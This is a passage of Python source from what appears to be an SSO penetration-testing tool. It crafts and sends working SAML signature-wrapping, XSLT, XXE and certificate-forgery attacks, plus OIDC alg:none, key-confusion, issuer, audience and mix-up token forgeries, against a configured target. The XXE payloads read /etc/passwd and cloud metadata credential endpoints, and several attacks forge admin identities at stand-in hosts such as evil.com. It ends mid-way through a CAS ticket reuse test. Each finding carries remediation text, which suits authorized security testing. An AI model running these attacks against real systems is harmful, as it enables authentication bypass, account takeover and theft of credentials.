        evil = self._evil_assertion(root)
        orig_copy = copy.deepcopy(orig)
        sig_in_orig = orig_copy.find(f".//{{{DS_NS}}}Signature")
        if sig_in_orig is None:
            sig_in_orig = etree.SubElement(evil, f"{{{DS_NS}}}Signature")
        else:
            orig_copy.remove(sig_in_orig)
            evil.append(sig_in_orig)
        obj_el = etree.SubElement(sig_in_orig, f"{{{DS_NS}}}Object")
        obj_el.append(orig_copy)
        root.remove(orig)
        root.append(evil)
        resp = self.sess.submit_saml(root, "XSW-5")
        ok, ev = self.sess.check(resp, "XSW-5")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 5 — Original in ds:Object, evil at top",
                Severity.CRITICAL, "Signed assertion hidden in ds:Object was validated, evil consumed.", ev,
                "Verify signed element is the one used for authn.", "XSW-5")
        return None

    def xsw_6(self) -> Optional[Finding]:
        logger.info("[XSW-6] Original in Advice element of evil assertion")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
        evil = self._evil_assertion(root)
        orig_copy = copy.deepcopy(orig)
        advice = etree.SubElement(evil, f"{{{SAML_NS}}}Advice")
        advice.append(orig_copy)
        root.remove(orig)
        root.append(evil)
        resp = self.sess.submit_saml(root, "XSW-6")
        ok, ev = self.sess.check(resp, "XSW-6")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 6 — Original in Advice, evil at top",
                Severity.CRITICAL, "Advice-nested assertion validated while evil consumed.", ev,
                "Ignore assertions within Advice elements.", "XSW-6")
        return None

    def xsw_7(self) -> Optional[Finding]:
        logger.info("[XSW-7] Evil assertion inside signed assertion's Extensions")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
        evil = self._evil_assertion(root)
        ext = etree.SubElement(orig, f"{{{SAML_NS}}}Extensions")
        ext.append(evil)
        resp = self.sess.submit_saml(root, "XSW-7")
        ok, ev = self.sess.check(resp, "XSW-7")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 7 — Evil nested in signed assertion's Extensions",
                Severity.CRITICAL, "SP extracted evil claims from Extensions child.", ev,
                "Do not process nested assertions.", "XSW-7")
        return None

    def xsw_8(self) -> Optional[Finding]:
        logger.info("[XSW-8] Evil at top, original in nested Response")
        root = copy.deepcopy(self._base_root())
        orig = SAMLBuilder.get_assertion(root)
        if orig is None:
            return None
        evil = self._evil_assertion(root)
        orig_copy = copy.deepcopy(orig)
        root.remove(orig)
        root.insert(0, evil)
        inner_resp = etree.SubElement(root, f"{{{SAMLP_NS}}}Response")
        inner_resp.set("ID", "_inner_" + uuid.uuid4().hex)
        inner_resp.set("Version", "2.0")
        inner_resp.append(orig_copy)
        resp = self.sess.submit_saml(root, "XSW-8")
        ok, ev = self.sess.check(resp, "XSW-8")
        if ok:
            return self.sess.add_finding(
                "XSW Variant 8 — Evil at top, original in nested Response",
                Severity.CRITICAL, "Nested Response's signed assertion validated, evil one consumed.", ev,
                "Reject responses with nested Response elements.", "XSW-8")
        return None

    # ---- Assertion replay ------------------------------------------------
    def assertion_replay(self) -> Optional[Finding]:
        logger.info("[REPLAY] Testing assertion replay...")
        root = self._base_root()
        results = []
        for i in range(3):
            resp = self.sess.submit_saml(copy.deepcopy(root), f"REPLAY-{i}")
            if resp:
                results.append((resp, *self.sess.check(resp, f"REPLAY-{i}")))
            time.sleep(1)
        successes = [r for r in results if r[1]]
        if len(successes) >= 2:
            return self.sess.add_finding(
                "SAML Assertion Replay", Severity.HIGH,
                "Same SAML assertion accepted multiple times.",
                f"Accepted {len(successes)}/{len(results)} times",
                "Track assertion IDs; reject duplicates. Enforce NotOnOrAfter.", "REPLAY")
        return None

    # ---- Response tampering (no re-sign) ---------------------------------
    def response_tampering(self) -> Optional[Finding]:
        logger.info("[TAMPER] Testing response tampering...")
        for victim in ["admin@target.com", "root@target.com", "ceo@target.com"]:
            root = copy.deepcopy(self._base_root())
            assertion = SAMLBuilder.get_assertion(root)
            if assertion is None:
                continue
            SAMLBuilder.set_nameid(assertion, victim)
            resp = self.sess.submit_saml(root, f"TAMPER-{victim}")
            ok, ev = self.sess.check(resp, f"TAMPER-{victim}")
            if ok:
                return self.sess.add_finding(
                    "SAML Response Tampering — No Signature Validation",
                    Severity.CRITICAL,
                    f"Modified NameID to '{victim}' without re-signing. SP accepted.",
                    ev, "Always validate XML-DSIG before processing.", "TAMPER")
        return None

    # ---- Comment injection in NameID -------------------------------------
    def comment_injection(self) -> Optional[Finding]:
        logger.info("[COMMENT] Testing NameID comment injection...")
        payloads = [
            "admin@target.com<!---->.evil.com",
            "admin<!--x-->@target.com",
            "admin@target.com<!---->",
            "adm<!---->in@target.com",
            "admin@tar<!---->get.com",
            "admin@target.com<!--.evil.com-->",
        ]
        for payload in payloads:
            root = copy.deepcopy(self._base_root())
            xml_str = etree.tostring(root, encoding="unicode")
            xml_str = re.sub(
                r'(<(?:\w+:)?NameID[^>]*>)[^<]*(</(?:\w+:)?NameID>)',
                rf'\1{payload}\2', xml_str, count=1)
            try:
                modified = etree.fromstring(xml_str.encode())
            except etree.XMLSyntaxError:
                continue
            resp = self.sess.submit_saml(modified, f"COMMENT-{payload[:15]}")
            ok, ev = self.sess.check(resp, "COMMENT")
            if ok:
                return self.sess.add_finding(
                    "SAML NameID Comment Injection", Severity.CRITICAL,
                    f"Comment injection bypassed NameID comparison: {payload}",
                    ev, "Strip XML comments from NameID before comparison.", "COMMENT")
        return None

    # ---- XSLT injection --------------------------------------------------
    def xslt_injection(self) -> Optional[Finding]:
        logger.info("[XSLT] Testing XSLT injection in transforms...")
        root = copy.deepcopy(self._base_root())
        xml_str = etree.tostring(root, encoding="unicode")
        xslt_payload = (
            f'<ds:Transform xmlns:ds="{DS_NS}" '
            f'Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
            '<xsl:template match="/">'
            f'<saml:Assertion xmlns:saml="{SAML_NS}" Version="2.0" ID="_xslt">'
            f'<saml:Issuer>{self.config.idp_entity_id or "https://idp.example.com"}</saml:Issuer>'
            '<saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>'
            '</saml:Assertion>'
            '</xsl:template>'
            '</xsl:stylesheet></ds:Transform>'
        )
        anchor = f'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
        if anchor in xml_str:
            xml_str = xml_str.replace(anchor, anchor + xslt_payload, 1)
        try:
            modified = etree.fromstring(xml_str.encode())
        except etree.XMLSyntaxError:
            return None
        resp = self.sess.submit_saml(modified, "XSLT")
        ok, ev = self.sess.check(resp, "XSLT")
        if ok:
            return self.sess.add_finding(
                "XSLT Injection in SAML Signature Transforms", Severity.CRITICAL,
                "XSLT transform replaced assertion content during signature processing.",
                ev, "Reject XSLT transforms. Whitelist canonicalization algorithms only.", "XSLT")
        return None

    # ---- XXE injection ---------------------------------------------------
    def xxe_injection(self) -> Optional[Finding]:
        logger.info("[XXE] Testing XXE in SAML processor...")
        root = copy.deepcopy(self._base_root())
        xml_str = etree.tostring(root, xml_declaration=True, encoding="UTF-8").decode()
        xxe_variants = [
            ('file_passwd',
             '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
             "&xxe;",
             ["root:", "daemon:", "/bin/"]),
            ('file_winini',
             '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>',
             "&xxe;",
             ["[extensions]", "[fonts]", "for 16-bit"]),
            ('ssrf_aws',
             '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
             "&xxe;",
             ["ami-id", "instance-id", "hostname", "security-credentials"]),
            ('ssrf_gcp',
             '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>',
             "&xxe;",
             ["instance", "project"]),
        ]
        for vname, doctype, entity, indicators in xxe_variants:
            modified = xml_str
            if '<?xml' in modified:
                modified = re.sub(r'<\?xml[^?]*\?>', r'<?xml version="1.0" encoding="UTF-8"?>\n' + doctype, modified, count=1)
            else:
                modified = '<?xml version="1.0" encoding="UTF-8"?>\n' + doctype + "\n" + modified
            modified = re.sub(
                r'(<(?:\w+:)?NameID[^>]*>)[^<]*(</(?:\w+:)?NameID>)',
                rf'\g<1>{entity}\g<2>', modified, count=1)
            encoded = base64.b64encode(modified.encode()).decode()
            target = self.config.acs_url or self.config.target_url
            self.sess.rate.wait()
            try:
                resp = self.sess.session.post(
                    target,
                    data={"SAMLResponse": encoded, "RelayState": ""},
                    allow_redirects=False,
                    timeout=self.config.timeout,
                )
                logger.info(f"[XXE-{vname}] → {resp.status_code}")
                if any(ind in resp.text for ind in indicators):
                    return self.sess.add_finding(
                        f"XXE in SAML Processor ({vname})", Severity.CRITICAL,
                        f"XML external entity processed. Indicator found in response.",
                        resp.text[:300],
                        "Disable external entity processing. Use defusedxml.", "XXE")
            except requests.RequestException as e:
                logger.error(f"[XXE-{vname}] {e}")
        return None

    # ---- Signature exclusion ---------------------------------------------
    def signature_exclusion(self) -> Optional[Finding]:
        logger.info("[SIG-EXCL] Testing signature removal...")
        root = copy.deepcopy(self._base_root())
        for sig in root.findall(f".//{{{DS_NS}}}Signature"):
            sig.getparent().remove(sig)
        assertion = SAMLBuilder.get_assertion(root)
        if assertion is not None:
            SAMLBuilder.set_nameid(assertion, self.EVIL_NAMEID)
        resp = self.sess.submit_saml(root, "SIG-EXCL")
        ok, ev = self.sess.check(resp, "SIG-EXCL")
        if ok:
            return self.sess.add_finding(
                "SAML Signature Exclusion", Severity.CRITICAL,
                "SP accepted assertion with all signatures removed.",
                ev, "Always require and validate signatures.", "SIG-EXCL")
        return None

    # ---- Certificate faking (REAL XML-DSIG) ------------------------------
    def certificate_faking(self) -> Optional[Finding]:
        logger.info("[CERT-FAKE] Signing with attacker certificate (real XML-DSIG)...")
        root = SAMLBuilder.build_response(
            issuer=self.config.idp_entity_id or "https://idp.example.com",
            name_id=self.EVIL_NAMEID,
            audience=self.config.sp_entity_id or "https://sp.example.com",
            acs_url=self.config.acs_url or "https://sp.example.com/acs",
            attributes={"email": self.EVIL_NAMEID, "role": "admin"},
        )
        assertion = SAMLBuilder.get_assertion(root)
        if assertion is not None:
            self.signer.sign_assertion(assertion)
        self.signer.sign_response(root)
        resp = self.sess.submit_saml(root, "CERT-FAKE")
        ok, ev = self.sess.check(resp, "CERT-FAKE")
        if ok:
            return self.sess.add_finding(
                "SAML Certificate Faking — Attacker-Signed Assertion", Severity.CRITICAL,
                "SP accepted assertion signed by attacker-generated certificate. "
                "Certificate pinning is not enforced.",
                ev, "Pin IdP certificates. Do not trust certs embedded in SAML.", "CERT-FAKE")
        return None

    def run_all(self) -> List[Finding]:
        logger.info("=" * 60 + "\n  SAML Attack Suite\n" + "=" * 60)
        if self.config.acs_url:
            self.sess.baseline.calibrate()
        attacks = [
            ("XSW-1", self.xsw_1), ("XSW-2", self.xsw_2), ("XSW-3", self.xsw_3),
            ("XSW-4", self.xsw_4), ("XSW-5", self.xsw_5), ("XSW-6", self.xsw_6),
            ("XSW-7", self.xsw_7), ("XSW-8", self.xsw_8),
            ("Assertion Replay", self.assertion_replay),
            ("Response Tampering", self.response_tampering),
            ("Comment Injection", self.comment_injection),
            ("XSLT Injection", self.xslt_injection),
            ("XXE Injection", self.xxe_injection),
            ("Signature Exclusion", self.signature_exclusion),
            ("Certificate Faking", self.certificate_faking),
        ]
        for name, fn in attacks:
            try:
                result = fn()
                if not result:
                    print(f"{Fore.GREEN}[-] {name}: Not vulnerable{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"[{name}] Error: {e}")
        return self.sess.findings

# ---------------------------------------------------------------------------
# OIDC Attacker — JWKS key confusion, alg:none, nonce replay, issuer, aud, mixup
# ---------------------------------------------------------------------------
class OIDCAttacker:
    def __init__(self, config: SSOConfig):
        self.config = config
        self.sess = AttackSession(config)
        self.discovery = OIDCDiscovery(self.sess.session, config.timeout)
        self.discovered = False
        self.jwks_public_keys: List[bytes] = []

    def auto_discover(self):
        if self.discovered:
            return
        disc_url = self.config.oidc_discovery_url
        if not disc_url:
            candidates = [
                self.config.oidc_auth_endpoint,
                self.config.target_url,
            ]
            for c in candidates:
                if c:
                    parsed = urllib.parse.urlparse(c)
                    disc_url = f"{parsed.scheme}://{parsed.netloc}"
                    break
        if disc_url:
            oidc_config = self.discovery.discover(disc_url)
            if oidc_config:
                if not self.config.oidc_auth_endpoint and oidc_config.get("authorization_endpoint"):
                    self.config.oidc_auth_endpoint = oidc_config["authorization_endpoint"]
                if not self.config.oidc_token_endpoint and oidc_config.get("token_endpoint"):
                    self.config.oidc_token_endpoint = oidc_config["token_endpoint"]
                if not self.config.oidc_userinfo_endpoint and oidc_config.get("userinfo_endpoint"):
                    self.config.oidc_userinfo_endpoint = oidc_config["userinfo_endpoint"]
                if not self.config.oidc_jwks_uri and oidc_config.get("jwks_uri"):
                    self.config.oidc_jwks_uri = oidc_config["jwks_uri"]
                self.jwks_public_keys = self.discovery.public_keys_pem
                self.discovered = True
                logger.info(f"OIDC discovery complete. {len(self.jwks_public_keys)} public keys extracted.")

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        pad = 4 - len(s) % 4
        if pad != 4:
            s += "=" * pad
        return base64.urlsafe_b64decode(s)

    def _decode_jwt_unsafe(self, token: str) -> Optional[Dict]:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
            return {"header": header, "payload": payload, "signature": parts[2]}
        except Exception as e:
            logger.error(f"JWT decode error: {e}")
            return None

    def _craft_none_token(self, payload: Dict) -> str:
        header = {"alg": "none", "typ": "JWT"}
        h = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h}.{p}."

    def _craft_hs256_token(self, payload: Dict, secret: bytes) -> str:
        header = {"alg": "HS256", "typ": "JWT"}
        h = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
        s = self._b64url_encode(sig)
        return f"{h}.{p}.{s}"

    def _evil_payload(self, base_payload: Optional[Dict] = None) -> Dict:
        now = int(time.time())
        p = {
            "iss": self.config.oidc_auth_endpoint or "https://auth.example.com",
            "sub": "admin",
            "aud": self.config.oidc_client_id or "client_id",
            "exp": now + 86400,
            "iat": now,
            "nonce": uuid.uuid4().hex,
            "email": "admin@target.com",
            "email_verified": True,
            "name": "Admin User",
        }
        if base_payload:
            for k in ("iss", "aud", "nonce"):
                if k in base_payload:
                    p[k] = base_payload[k]
            p["sub"] = "admin"
            p["email"] = "admin@target.com"
            p["exp"] = now + 86400
        return p

    def _submit_token(self, token: str, tag: str) -> Optional[requests.Response]:
        targets = []
        if self.config.oidc_userinfo_endpoint:
            targets.append(self.config.oidc_userinfo_endpoint)
        targets.append(self.config.target_url)
        for target in targets:
            self.sess.rate.wait()
            try:
                resp = self.sess.session.get(
                    target,
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=self.config.timeout,
                    allow_redirects=False,
                )
                logger.info(f"[{tag}] {target[-40:]} → {resp.status_code}")
                self.sess.rate.record_success()
                return resp
            except requests.RequestException as e:
                logger.error(f"[{tag}] {e}")
                self.sess.rate.record_error()
        return None

    def _submit_token_to_callback(self, token: str, tag: str) -> Optional[requests.Response]:
        callback = self.config.oidc_redirect_uri or self.config.target_url.rstrip("/") + "/callback"
        self.sess.rate.wait()
        try:
            resp = self.sess.session.post(
                callback,
                data={"id_token": token, "state": "test_state"},
                timeout=self.config.timeout,
                allow_redirects=False,
            )
            logger.info(f"[{tag}] callback → {resp.status_code}")
            self.sess.rate.record_success()
            return resp
        except requests.RequestException as e:
            logger.error(f"[{tag}] {e}")
            self.sess.rate.record_error()
            return None

    def _check_oidc_success(self, resp: Optional[requests.Response], tag: str) -> Tuple[bool, str]:
        if resp is None:
            return False, "no response"
        indicators = []
        if resp.status_code == 200:
            try:
                body = resp.json()
                if body.get("sub") == "admin" or body.get("email") == "admin@target.com":
                    indicators.append(f"evil_claims_returned:{body.get('sub','')}")
            except (json.JSONDecodeError, ValueError):
                pass
        session_cookies = [c for c in resp.cookies.keys()
                          if any(s in c.lower() for s in ["session", "sid", "token", "auth", "connect"])]
        if session_cookies:
            indicators.append(f"session_cookie:{session_cookies}")
        if resp.status_code == 302:
            loc = resp.headers.get("Location", "")
            if loc and "error" not in loc.lower() and "login" not in loc.lower():
                indicators.append(f"redirect:{loc[:60]}")
        return len(indicators) >= 1, "; ".join(indicators)

    # ---- alg:none attack -------------------------------------------------
    def alg_none_attack(self) -> Optional[Finding]:
        logger.info("[ALG-NONE] Testing algorithm 'none' bypass...")
        base = None
        if self.config.id_token_sample:
            decoded = self._decode_jwt_unsafe(self.config.id_token_sample)
            if decoded:
                base = decoded["payload"]
        evil = self._evil_payload(base)
        alg_variants = ["none", "None", "NONE", "nOnE", "NoNe"]
        for alg in alg_variants:
            header = {"alg": alg, "typ": "JWT"}
            h = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            p = self._b64url_encode(json.dumps(evil, separators=(",", ":")).encode())
            token = f"{h}.{p}."
            resp = self._submit_token(token, f"ALG-{alg}")
            ok, ev = self._check_oidc_success(resp, f"ALG-{alg}")
            if ok:
                return self.sess.add_finding(
                    f"OIDC Algorithm None Bypass (alg={alg})", Severity.CRITICAL,
                    f"Token with alg='{alg}' and empty signature accepted.",
                    ev, "Reject 'none' algorithm. Whitelist only RS256/ES256.", "ALG_NONE")
            resp2 = self._submit_token_to_callback(token, f"ALG-{alg}-CB")
            ok2, ev2 = self._check_oidc_success(resp2, f"ALG-{alg}-CB")
            if ok2:
                return self.sess.add_finding(
                    f"OIDC Algorithm None Bypass via Callback (alg={alg})", Severity.CRITICAL,
                    f"Callback accepted token with alg='{alg}'.",
                    ev2, "Reject 'none' algorithm everywhere.", "ALG_NONE")
        return None

    # ---- HMAC key confusion (RSA pub key as HMAC secret) -----------------
    def hmac_key_confusion(self) -> Optional[Finding]:
        logger.info("[KEY-CONF] Testing RSA→HMAC key confusion...")
        if not self.jwks_public_keys:
            self.auto_discover()
        if not self.jwks_public_keys:
            logger.warning("[KEY-CONF] No JWKS public keys available. Skipping.")
            return None
        evil = self._evil_payload()
        for i, pub_pem in enumerate(self.jwks_public_keys):
            token = self._craft_hs256_token(evil, pub_pem)
            resp = self._submit_token(token, f"KEY-CONF-{i}")
            ok, ev = self._check_oidc_success(resp, f"KEY-CONF-{i}")
            if ok:
                return self.sess.add_finding(
                    "OIDC RSA→HMAC Key Confusion", Severity.CRITICAL,
                    "Server accepted HS256 token signed with RSA public key as HMAC secret. "
                    "Attacker can forge arbitrary tokens using the public JWKS key.",
                    ev,
                    "Enforce expected algorithm per key. Never accept HS256 when RS256 is expected.",
                    "KEY_CONFUSION")
            resp2 = self._submit_token_to_callback(token, f"KEY-CONF-{i}-CB")
            ok2, ev2 = self._check_oidc_success(resp2, f"KEY-CONF-{i}-CB")
            if ok2:
                return self.sess.add_finding(
                    "OIDC RSA→HMAC Key Confusion via Callback", Severity.CRITICAL,
                    "Callback accepted HS256 token signed with RSA public key.",
                    ev2, "Enforce algorithm restrictions per key.", "KEY_CONFUSION")
            common_formats = [
                pub_pem,
                pub_pem.decode().replace("\n", "").encode(),
                pub_pem.decode().strip().encode(),
            ]
            for fmt in common_formats[1:]:
                token2 = self._craft_hs256_token(evil, fmt)
                resp3 = self._submit_token(token2, f"KEY-CONF-{i}-fmt")
                ok3, ev3 = self._check_oidc_success(resp3, f"KEY-CONF-{i}-fmt")
                if ok3:
                    return self.sess.add_finding(
                        "OIDC RSA→HMAC Key Confusion (alt format)", Severity.CRITICAL,
                        "HS256 accepted with alternate PEM formatting of public key.",
                        ev3, "Enforce algorithm per key in JWKS.", "KEY_CONFUSION")
        return None

    # ---- Nonce replay ----------------------------------------------------
    def nonce_replay(self) -> Optional[Finding]:
        logger.info("[NONCE] Testing nonce replay...")
        if not self.config.oidc_auth_endpoint:
            logger.warning("[NONCE] No auth endpoint. Skipping.")
            return None
        static_nonce = "replay_" + uuid.uuid4().hex[:12]
        static_state = "state_" + uuid.uuid4().hex[:12]
        params = {
            "response_type": "code",
            "client_id": self.config.oidc_client_id or "test_client",
            "redirect_uri": self.config.oidc_redirect_uri or self.config.target_url + "/callback",
            "scope": "openid email profile",
            "state": static_state,
            "nonce": static_nonce,
        }
        codes = []
        for attempt in range(3):
            self.sess.rate.wait()
            try:
                resp = self.sess.session.get(
                    self.config.oidc_auth_endpoint, params=params,
                    allow_redirects=False, timeout=self.config.timeout)
                loc = resp.headers.get("Location", "")
                m = re.search(r"[?&]code=([^&]+)", loc)
                if m:
                    codes.append(m.group(1))
                logger.info(f"[NONCE-{attempt}] → {resp.status_code} code={'yes' if m else 'no'}")
            except requests.RequestException as e:
                logger.error(f"[NONCE-{attempt}] {e}")
            time.sleep(1)
        if len(codes) >= 2:
            return self.sess.add_finding(
                "OIDC Nonce Replay Accepted", Severity.HIGH,
                f"Same nonce '{static_nonce}' accepted {len(codes)} times, issuing {len(codes)} codes.",
                f"Codes: {codes[:3]}",
                "Bind nonce to session. Reject reused nonce values.", "NONCE_REPLAY")
        return None

    # ---- Issuer confusion ------------------------------------------------
    def issuer_confusion(self) -> Optional[Finding]:
        logger.info("[ISSUER] Testing issuer validation...")
        evil_issuers = [
            "https://evil-idp.com",
            "https://accounts.google.com.evil.com",
            "https://login.microsoftonline.com.evil.com",
            "null",
            "",
            "https://auth.example.com/../../evil",
            "https://auth.example.com@evil.com",
            "https://evil.com/.well-known/../auth",
        ]
        for iss in evil_issuers:
            evil = self._evil_payload()
            evil["iss"] = iss
            token = self._craft_none_token(evil)
            resp = self._submit_token(token, f"ISS-{iss[:25]}")
            ok, ev = self._check_oidc_success(resp, f"ISS-{iss[:25]}")
            if ok:
                return self.sess.add_finding(
                    f"OIDC Issuer Confusion (iss={iss[:50]})", Severity.CRITICAL,
                    f"Token with forged issuer '{iss}' accepted.",
                    ev, "Strictly validate 'iss' against expected issuer.", "ISSUER_CONFUSION")
        return None

    # ---- Audience bypass -------------------------------------------------
    def audience_bypass(self) -> Optional[Finding]:
        logger.info("[AUD] Testing audience validation...")
        evil_auds = [
            "evil_client",
            "*",
            "",
            "null",
            ["legitimate_client", "evil_client"],
            "https://evil.com",
            self.config.oidc_client_id + ".evil" if self.config.oidc_client_id else "wrong_client",
        ]
        for aud in evil_auds:
            evil = self._evil_payload()
            evil["aud"] = aud
            token = self._craft_none_token(evil)
            aud_str = str(aud)[:30]
            resp = self._submit_token(token, f"AUD-{aud_str}")
            ok, ev = self._check_oidc_success(resp, f"AUD-{aud_str}")
            if ok:
                return self.sess.add_finding(
                    f"OIDC Audience Bypass (aud={aud_str})", Severity.HIGH,
                    f"Token with audience '{aud}' accepted by RP.",
                    ev, "Validate 'aud' matches this RP's client_id.", "AUDIENCE_BYPASS")
        return None

    # ---- Token substitution ----------------------------------------------
    def token_substitution(self) -> Optional[Finding]:
        logger.info("[TOKEN-SUB] Testing token substitution...")
        if not self.config.oidc_token_endpoint:
            logger.warning("[TOKEN-SUB] No token endpoint. Skipping.")
            return None
        payloads = [
            {
                "grant_type": "authorization_code",
                "code": "stolen_" + uuid.uuid4().hex[:8],
                "redirect_uri": self.config.oidc_redirect_uri or self.config.target_url + "/callback",
                "client_id": self.config.oidc_client_id or "test",
                "client_secret": self.config.oidc_client_secret or "test",
            },
            {
                "grant_type": "authorization_code",
                "code": "stolen_" + uuid.uuid4().hex[:8],
                "redirect_uri": "https://evil.com/callback",
                "client_id": self.config.oidc_client_id or "test",
                "client_secret": self.config.oidc_client_secret or "test",
            },
            {
                "grant_type": "refresh_token",
                "refresh_token": "stolen_refresh_" + uuid.uuid4().hex[:8],
                "client_id": self.config.oidc_client_id or "test",
                "client_secret": self.config.oidc_client_secret or "test",
            },
        ]
        for i, data in enumerate(payloads):
            self.sess.rate.wait()
            try:
                resp = self.sess.session.post(
                    self.config.oidc_token_endpoint, data=data,
                    timeout=self.config.timeout)
                logger.info(f"[TOKEN-SUB-{i}] → {resp.status_code}")
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        if "access_token" in body or "id_token" in body:
                            return self.sess.add_finding(
                                "OIDC Token Substitution / Code Injection", Severity.HIGH,
                                f"Token endpoint issued tokens for grant_type={data['grant_type']} "
                                f"with redirect_uri={data.get('redirect_uri','')}.",
                                f"Keys returned: {list(body.keys())}",
                                "Bind codes to client+redirect_uri. One-time-use codes.",
                                "TOKEN_SUBSTITUTION")
                    except (json.JSONDecodeError, ValueError):
                        pass
            except requests.RequestException as e:
                logger.error(f"[TOKEN-SUB-{i}] {e}")
        return None

    # ---- Mix-up attack ---------------------------------------------------
    def mixup_attack(self) -> Optional[Finding]:
        logger.info("[MIXUP] Testing IdP mix-up...")
        if not self.config.oidc_auth_endpoint:
            logger.warning("[MIXUP] No auth endpoint. Skipping.")
            return None
        state = "mixup_" + uuid.uuid4().hex[:8]
        params = {
            "response_type": "code",
            "client_id": self.config.oidc_client_id or "test",
            "redirect_uri": self.config.oidc_redirect_uri or self.config.target_url + "/callback",
            "scope": "openid email profile",
            "state": state,
            "nonce": uuid.uuid4().hex,
        }
        self.sess.rate.wait()
        try:
            resp = self.sess.session.get(
                self.config.oidc_auth_endpoint, params=params,
                allow_redirects=False, timeout=self.config.timeout)
        except requests.RequestException as e:
            logger.error(f"[MIXUP] Auth request failed: {e}")
            return None
        callback = self.config.oidc_redirect_uri or self.config.target_url + "/callback"
        evil_params = {
            "code": "evil_" + uuid.uuid4().hex[:8],
            "state": state,
            "iss": "https://evil-idp.com",
        }
        self.sess.rate.wait()
        try:
            resp2 = self.sess.session.get(
                callback, params=evil_params,
                allow_redirects=False, timeout=self.config.timeout)
            logger.info(f"[MIXUP] Callback → {resp2.status_code}")
            session_cookies = [c for c in resp2.cookies.keys()
                              if any(s in c.lower() for s in ["session", "sid", "token", "auth"])]
            if resp2.status_code in (200, 302) and "error" not in resp2.text.lower()[:300]:
                if session_cookies or (resp2.status_code == 302
                        and "login" not in resp2.headers.get("Location", "").lower()):
                    return self.sess.add_finding(
                        "OIDC IdP Mix-Up Attack", Severity.HIGH,
                        "Callback accepted authorization response with evil issuer. "
                        "RP may send code to attacker-controlled token endpoint.",
                        f"Status: {resp2.status_code}, cookies: {session_cookies}",
                        "Validate 'iss' parameter. Bind state to expected IdP.", "MIXUP")
        except requests.RequestException as e:
            logger.error(f"[MIXUP] Callback failed: {e}")
        return None

    # ---- ID Token embedded claims attack ---------------------------------
    def id_token_claim_injection(self) -> Optional[Finding]:
        logger.info("[CLAIM-INJ] Testing claim injection in ID tokens...")
        evil = self._evil_payload()
        injection_claims = [
            {"is_admin": True, "role": "superadmin", "groups": ["admin", "root"]},
            {"scope": "admin:all read:all write:all", "permissions": ["*"]},
            {"tenant_id": "admin_tenant", "org_role": "owner"},
        ]
        for extra in injection_claims:
            payload = {**evil, **extra}
            token = self._craft_none_token(payload)
            resp = self._submit_token(token, "CLAIM-INJ")
            ok, ev = self._check_oidc_success(resp, "CLAIM-INJ")
            if ok:
                return self.sess.add_finding(
                    "OIDC ID Token Claim Injection", Severity.HIGH,
                    f"Token with injected claims accepted: {list(extra.keys())}",
                    ev, "Ignore unknown claims. Authorize based on server-side roles.", "CLAIM_INJECTION")
        return None

    def run_all(self) -> List[Finding]:
        logger.info("=" * 60 + "\n  OIDC Attack Suite\n" + "=" * 60)
        self.auto_discover()
        attacks = [
            ("Algorithm None", self.alg_none_attack),
            ("HMAC Key Confusion", self.hmac_key_confusion),
            ("Nonce Replay", self.nonce_replay),
            ("Issuer Confusion", self.issuer_confusion),
            ("Audience Bypass", self.audience_bypass),
            ("Token Substitution", self.token_substitution),
            ("Mix-Up Attack", self.mixup_attack),
            ("Claim Injection", self.id_token_claim_injection),
        ]
        for name, fn in attacks:
            try:
                result = fn()
                if not result:
                    print(f"{Fore.GREEN}[-] {name}: Not vulnerable{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"[{name}] Error: {e}")
        return self.sess.findings


# ---------------------------------------------------------------------------
# CAS Attacker
# ---------------------------------------------------------------------------
class CASAttacker:
    def __init__(self, config: SSOConfig):
        self.config = config
        self.sess = AttackSession(config)

    def service_ticket_reuse(self) -> Optional[Finding]:
        logger.info("[CAS-REUSE] Testing service ticket reuse...")
        if not self.config.cas_validate_url:
            logger.warning("[CAS-REUSE] No CAS validate URL. Skipping.")
            return None
        ticket = "ST-" + uuid.uuid4().hex
        service = self.config.cas_service_url or self.config.target_url
        successes = 0
        for i in range(3):
            self.sess.rate.wait()
            try:
                resp = self.sess.session.get(
                    self.config.cas_validate_url,
                    params={"ticket": ticket, "service": service},
                    timeout=self.config.timeout, allow_redirects=False)
                logger.info(f"[CAS-REUSE-{i}] → {resp.status_code}")
                if ("yes" in resp.text.lower()[:50] or
                        "authenticationSuccess" in resp.text or
                        "<cas:user>" in resp.text):
                    successes += 1
            except requests.RequestException as e:
                logger.error(f"[CAS-REUSE-{i}] {e}")
            time.sleep(0.5)
        if successes >= 2:
            return self.sess.add_finding(
                "CAS Service Ticket Reuse", Severity.HIGH,
                f"Same ticket accepted {successes} times.",
                f"Ticket: {ticket[:20]}...",
